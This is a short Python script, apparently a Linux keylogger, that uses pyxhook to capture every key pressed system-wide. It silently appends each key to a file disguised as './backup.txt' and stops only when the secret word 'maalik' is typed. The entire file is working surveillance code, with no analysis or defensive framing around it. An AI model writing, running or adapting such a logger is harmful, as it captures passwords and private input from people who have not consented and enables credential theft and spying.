import getpass
from sys import exit
from time import sleep

import pyxhook

# get username
USER = getpass.getuser()

############### GLOBAL VARS ###############

END_SIG = "maalik"
LOG_FILE = "./backup.txt"
# eg ->  LOG_FILE='/home/'+USER+'/Desktop/backup.txt'

###########################################

temp = ""


def OnKeyPress(event):
    global temp
    temp += event.Key
    # print(psutil.cpu_percent())   # see CPU usage
    with open(LOG_FILE, "a") as f:
        f.write("{}\n".format(event.Key))

    # reduce load on CPU when special key is pressed
    if (
        event.Key == "Left"
        or event.Key == "Right"
        or event.Key == "Up"
        or event.Key == "Tab"
        or event.Key == "Down"
        or event.Key == "space"
        or event.Key == "Shift_R"
        or event.Key == "Return"
        or event.Key == "Shift_L"
        or event.Key == "Super_L"
        or event.Key == "Super_R"
        or event.Key == "Control_R"
        or event.Key == "Control_L"
        or event.Key == "BackSpace"
    ):
        sleep(1)

    for i in range(len(temp) - 1):
        if END_SIG[i] != temp[i]:
            temp = ""
            break

    if temp == END_SIG:
        exit()


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
